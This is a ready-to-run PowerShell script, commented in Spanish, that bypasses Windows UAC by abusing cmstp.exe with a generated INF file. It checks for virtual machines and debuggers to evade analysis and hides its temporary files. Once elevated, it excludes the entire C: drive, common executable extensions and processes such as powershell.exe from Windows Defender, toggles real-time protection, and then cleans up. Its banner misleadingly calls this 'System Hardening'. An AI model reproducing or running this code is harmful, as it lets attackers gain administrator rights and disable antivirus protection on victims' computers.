# UACBypass.ps1 - Bypass UAC y excluir disco C:\
function Invoke-UACBypass {
    param()
    
    # Anti-análisis mejorado
    $analysisFlags = @()
    if ($env:PROCESSOR_ARCHITECTURE -eq "ARM64") { $analysisFlags += "ARM64" }
    if ((Get-WmiObject Win32_ComputerSystem).Model -like "*VM*") { $analysisFlags += "VM" }
    if ((Get-WmiObject Win32_ComputerSystem).Model -like "*Virtual*") { $analysisFlags += "Virtual" }
    if (Get-Process -Name "ollydbg" -ErrorAction SilentlyContinue) { $analysisFlags += "Debugger" }
    
    if ($analysisFlags.Count -gt 1) {
        Write-Host "[-] Entorno de análisis detectado" -ForegroundColor Red
        return $false
    }
    
    # Verificar si ya somos administrador
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    if ($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
        Write-Host "[+] Ya ejecutando como administrador" -ForegroundColor Green
        Execute-ElevatedActions
        return $true
    }
    
    # Crear archivo INF temporal con nombre aleatorio
    $tempDir = $env:TEMP
    $randomName = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_})
    $infPath = Join-Path $tempDir "$randomName.inf"
    
    $infContent = @"
[Version]
Signature=`$CHICAGO`$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
REPLACE_COMMAND_LINE
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CorpVPN"
ShortSvcName="CorpVPN"
"@

    # Crear script PowerShell que se ejecutará elevado
    $elevatedScript = @'
# Acciones ejecutadas con privilegios elevados
Start-Sleep -Seconds 1

function Add-DefenderExclusions {
    try {
        Write-Host "[+] Agregando exclusiones de Windows Defender..." -ForegroundColor Yellow
        
        # Excluir todo el disco C:\
        Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
        Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
        
        # Excluir extensiones comunes
        $extensions = @("*.exe", "*.dll", "*.ps1", "*.vbs", "*.bat", "*.cmd")
        foreach ($ext in $extensions) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
        }
        Write-Host "[+] Extensiones comunes excluidas" -ForegroundColor Green
        
        # Excluir procesos
        $processes = @("java.exe", "python.exe", "node.exe", "powershell.exe")
        foreach ($proc in $processes) {
            Add-MpPreference -ExclusionProcess $proc -ErrorAction SilentlyContinue
        }
        Write-Host "[+] Procesos comunes excluidos" -ForegroundColor Green
        
        # Deshabilitar protección temporalmente
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
        
        Write-Host "[+] Configuración de Defender modificada exitosamente" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[-] Error en exclusiones: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

function Save-LocalLog {
    try {
        $systemInfo = @{
            ComputerName = $env:COMPUTERNAME
            UserName = $env:USERNAME
            Domain = $env:USERDOMAIN
            OS = (Get-WmiObject Win32_OperatingSystem).Caption
            Architecture = $env:PROCESSOR_ARCHITECTURE
            Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            DefenderExcluded = "C:\ and multiple extensions"
            UACBypass = "Completed"
        }
        
        $jsonData = $systemInfo | ConvertTo-Json
        $logPath = "$env:TEMP\system_config.log"
        $jsonData | Out-File -FilePath $logPath -Encoding UTF8
        
        Write-Host "[+] Log guardado en: $logPath" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[-] Error guardando log: $($_.Exception.Message)" -ForegroundColor Yellow
        return $false
    }
}

# Ejecutar acciones elevadas
$exclusionResult = Add-DefenderExclusions
$logResult = Save-LocalLog

if ($exclusionResult -and $logResult) {
    Write-Host "[+] Todas las acciones completadas exitosamente" -ForegroundColor Green
} else {
    Write-Host "[-] Algunas acciones fallaron" -ForegroundColor Red
}

Write-Host "[+] Proceso completado. Cerrando en 3 segundos..." -ForegroundColor Cyan
Start-Sleep -Seconds 3
'@

    $elevatedScriptPath = Join-Path $tempDir "$randomName-elevated.ps1"
    $infContent = $infContent -replace "REPLACE_COMMAND_LINE", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$elevatedScriptPath`""
    
    try {
        # Escribir archivos temporales
        Set-Content -Path $infPath -Value $infContent -Encoding ASCII
        Set-Content -Path $elevatedScriptPath -Value $elevatedScript -Encoding UTF8
        
        # Ocultar archivos temporales
        attrib +h $infPath 2>&1 | Out-Null
        attrib +h $elevatedScriptPath 2>&1 | Out-Null
        
        # Ejecutar cmstp.exe con el INF
        $cmstpPath = Join-Path $env:WinDir "system32\cmstp.exe"
        
        Write-Host "[+] Iniciando bypass UAC..." -ForegroundColor Yellow
        
        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processStartInfo.FileName = $cmstpPath
        $processStartInfo.Arguments = "/au `"$infPath`""
        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $processStartInfo.UseShellExecute = $false
        $processStartInfo.CreateNoWindow = $true
        
        $process = [System.Diagnostics.Process]::Start($processStartInfo)
        
        # Esperar y simular interacción con la ventana UAC
        Start-Sleep -Seconds 4
        
        # Buscar y cerrar ventana de CorpVPN
        try {
            Get-Process -Name "cmstp" -ErrorAction SilentlyContinue | Out-Null
            Add-Type -AssemblyName Microsoft.VisualBasic
            [Microsoft.VisualBasic.Interaction]::AppActivate("CorpVPN") | Out-Null
            Start-Sleep -Milliseconds 500
            
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
        }
        catch {
            Write-Host "[-] No se pudo interactuar con la ventana UAC" -ForegroundColor Yellow
        }
        
        # Esperar a que termine
        $process.WaitForExit(15000)
        
        # Limpieza retardada
        Start-Sleep -Seconds 8
        if (Test-Path $infPath) { 
            Remove-Item $infPath -Force -ErrorAction SilentlyContinue 
        }
        if (Test-Path $elevatedScriptPath) { 
            Remove-Item $elevatedScriptPath -Force -ErrorAction SilentlyContinue 
        }
        
        Write-Host "[+] UAC Bypass completado exitosamente" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[-] Error en UAC Bypass: $($_.Exception.Message)" -ForegroundColor Red
        
        # Limpieza en caso de error
        if (Test-Path $infPath) { Remove-Item $infPath -Force -ErrorAction SilentlyContinue }
        if (Test-Path $elevatedScriptPath) { Remove-Item $elevatedScriptPath -Force -ErrorAction SilentlyContinue }
        
        return $false
    }
}

function Execute-ElevatedActions {
    Write-Host "[+] Ejecutando acciones con privilegios elevados..." -ForegroundColor Cyan
    
    # Excluir disco C:\
    try {
        Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
        Write-Host "[+] Disco C:\ excluido de Windows Defender" -ForegroundColor Green
        
        # Excluir extensiones
        $extensions = @("*.exe", "*.dll", "*.ps1", "*.vbs", "*.bat", "*.cmd")
        foreach ($ext in $extensions) {
            Add-MpPreference -ExclusionExtension $ext -ErrorAction SilentlyContinue
        }
        Write-Host "[+] Extensiones excluidas" -ForegroundColor Green
        
        # Guardar log local
        $logPath = "$env:TEMP\elevated_actions.log"
        "Elevated actions completed at $(Get-Date)" | Out-File -FilePath $logPath
        Write-Host "[+] Log de acciones guardado" -ForegroundColor Green
    }
    catch {
        Write-Host "[-] Error en acciones elevadas: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Ejecutar bypass
Write-Host "=== UAC Bypass & System Hardening ===" -ForegroundColor Magenta
Write-Host "[*] Iniciando proceso..." -ForegroundColor Yellow

$result = Invoke-UACBypass

if ($result) {
    Write-Host "[+] Proceso completado exitosamente" -ForegroundColor Green
} else {
    Write-Host "[-] El proceso falló o fue cancelado" -ForegroundColor Red
}

Write-Host "[*] Script finalizado" -ForegroundColor Gray